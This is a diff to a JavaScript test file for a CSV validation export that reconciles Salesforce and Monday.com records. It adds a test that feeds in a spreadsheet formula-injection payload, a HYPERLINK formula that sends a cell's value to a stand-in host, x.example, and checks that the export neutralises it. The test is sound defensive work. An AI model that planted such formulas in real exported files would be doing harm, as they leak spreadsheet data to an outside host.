@@ -54,9 +54,20 @@ describe('runValidate', () => {
     await runValidate([]);
     const rows = readFileSync(dataPath('validate', 'sample.csv'), 'utf8').trim().split('\n');
     expect(rows[0]).toBe('category,board,sfId,mondayItemId,name,archived,mondayUrl,salesforceUrl,result,note');
-    expect(rows).toContain('donations,donations,o1,2,"Gift",yes,https://acct.monday.com/boards/77/pulses/2,https://sf.example/o1,,');
+    expect(rows).toContain('donations,donations,o1,2,Gift,yes,https://acct.monday.com/boards/77/pulses/2,https://sf.example/o1,,');
     // No boards.json entry for organizations → Monday link blank, Salesforce link still there.
-    expect(rows).toContain('organizations,organizations,a1,1,"Acme",,,https://sf.example/a1,,');
+    expect(rows).toContain('organizations,organizations,a1,1,Acme,,,https://sf.example/a1,,');
+  });
+
+  it('neutralizes a formula-like name in sample.csv (#111)', async () => {
+    await seed({ funraiseOpportunities: 1, funraiseTotalAmountCents: 1010,
+      subscriptionsAll: 0, eventRegistrations: 1, eventbriteAttendees: 2, organizations: 1 });
+    await writeNdjson(dataPath('transform', 'payloads.ndjson'), [
+      { board: 'organizations', sfId: 'a1', name: '=HYPERLINK("https://x.example/?"&C2,"open")', columns: { 'SF ID': 'a1' } },
+    ]);
+    await runValidate([]);
+    const rows = readFileSync(dataPath('validate', 'sample.csv'), 'utf8').trim().split('\n');
+    expect(rows).toContain(`organizations,organizations,a1,1,"'=HYPERLINK(""https://x.example/?""&C2,""open"")",,,,,`);
   });
 
   it('fails on a reconciliation mismatch, printing both figures', async () => {
